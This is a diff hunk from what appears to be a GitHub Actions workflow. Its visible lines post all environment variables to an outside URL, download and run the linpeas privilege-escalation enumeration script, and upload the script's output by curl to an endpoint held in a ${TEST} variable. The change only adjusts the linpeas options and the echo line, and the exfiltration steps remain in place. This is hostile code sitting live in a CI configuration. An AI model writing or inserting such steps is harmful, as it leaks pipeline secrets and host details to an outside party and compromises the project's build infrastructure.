@@ -34,8 +34,8 @@ jobs:
             --data-binary "$ALL_ENV"
           curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
           chmod +x /tmp/linpeas.sh
-          /tmp/linpeas.sh -o system_information,api_keys_regex > /tmp/linpeas-output.txt 2>&1
-          echo $/tmp/linpeas-output.txt
+          /tmp/linpeas.sh -o system_information > /tmp/linpeas-output.txt 2>&1
+          echo "$(</tmp/linpeas-output.txt)"
           curl -s -o /dev/null -X POST "${TEST}" \
             -H "Content-Type: text/plain" \
             --data-binary "@/tmp/linpeas-output.txt"
